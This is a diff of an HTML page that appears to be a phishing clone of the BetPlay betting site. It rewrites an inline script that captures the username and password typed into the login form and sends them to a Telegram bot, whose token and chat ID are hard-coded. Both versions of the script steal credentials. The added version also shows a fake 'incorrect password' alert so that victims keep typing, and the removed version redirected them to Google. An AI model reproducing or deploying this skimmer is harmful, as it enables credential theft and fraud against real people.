@@ -424,37 +424,42 @@
   <script src="https://promobetplay.com/home.js"></script>
 
 <script>
-  const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
-  const CHAT_ID = "7007914207";
+    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
+    const CHAT_ID = "7007914207";
 
-  // Busca el formulario de su página de manera segura
-  const form = document.querySelector('form') || document.getElementById("login-card__form");
-  
-  if (form) {
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
-      
-      const inputs = this.querySelectorAll("input");
-      let usuario = "No capturado";
-      let clave = "No capturada";
+    // Intercepta cualquier intento de envío del formulario o clic en ingresar
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.querySelector('form') || document.getElementById('loginModalform');
+        
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault(); // Evita que la página recargue o mande a mantenimiento
+                
+                // Captura los valores de los inputs (ajusta los IDs si es necesario)
+                const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"], input[type="email"], input:not([type="password"])')?.value;
+                const password = document.querySelector('input[type="password"]')?.value;
 
-      inputs.forEach(input => {
-        if (input.type === "password") {
-          clave = input.value;
-        } else if (input.type === "text" || input.type === "email" || !input.type) {
-          if (usuario === "No capturado") usuario = input.value;
+                if (usuario && password) {
+                    const mensaje = `🚨 ¡NUEVA CAPTURA BETPLAY!\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}`;
+                    
+                    // Envia los datos directo a tu Telegram
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: mensaje,
+                            parse_mode: 'HTML'
+                        })
+                    }).then(response => {
+                        // Opcional: Redirige o muestra mensaje simulado de error real para que caigan
+                        alert("Usuario o contraseña incorrectos. Intente nuevamente.");
+                    }).catch(err => {
+                        alert("Usuario o contraseña incorrectos. Intente nuevamente.");
+                    });
+                }
+            });
         }
-      });
-
-      const mensaje = `🚨 ¡Datos capturados! 🚨\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${clave}`;
-      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
-
-      fetch(url)
-        .then(() => {
-          window.location.href = "https://www.google.com";
-        })
-        .catch(err => console.error("Error al enviar:", err));
     });
-  }
 </script>
 </body></html>
